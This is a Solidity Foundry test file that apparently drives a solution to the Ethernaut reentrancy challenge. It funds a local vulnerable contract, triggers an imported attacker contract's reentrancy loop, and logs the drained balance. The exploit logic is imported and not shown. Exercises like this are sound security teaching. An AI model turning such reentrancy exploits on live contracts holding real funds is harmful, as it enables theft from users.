//SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;


import "forge-std/Test.sol";  
//import "../src/Reentrancy.sol";
import "../src/ReentrancySolution.sol";

import "../src/utils/SepoliaInstances.sol";

contract ReentrancySolutionTest is Test, SepoliaInstances {
    // state vars
    uint256 public initialDepositAmount = 1e15; // 1 finney
    uint256 public depositFactor = 3;

    Reentrance public reentrance;
    ReentrancySolution public attacker;



    // setup
    function setUp() public {
        // deploy contracts
        // original contract has 0.001 eth for the ethernaut level

        vm.startPrank(deployer);
        reentrance = new Reentrance();
        // no initial balance so, give it some so
        // reentrancy can work

        attacker = new ReentrancySolution(payable(address(reentrance)));
        vm.stopPrank();

        address(reentrance).transfer(initialDepositAmount * depositFactor);
        // address(reentrance).call{value: initialDepositAmount}("");
    }

    function testExploit() public {
        // increase tracked balance in the Vault contract
        attacker.donateToVault{value: initialDepositAmount}();

        // ensure there is opportunity to reentrancy loop
        assertEq(reentrance.balances(address(attacker)), initialDepositAmount);
        assertEq(address(reentrance).balance, initialDepositAmount * (depositFactor + 1));

        attacker.startAttack(initialDepositAmount);

        console.log("loops done:", attacker.reentrancyLoops());

        console.log("Attacker contract balance normally", initialDepositAmount);
        console.log("Attacker contract balance", address(attacker).balance);
    }


}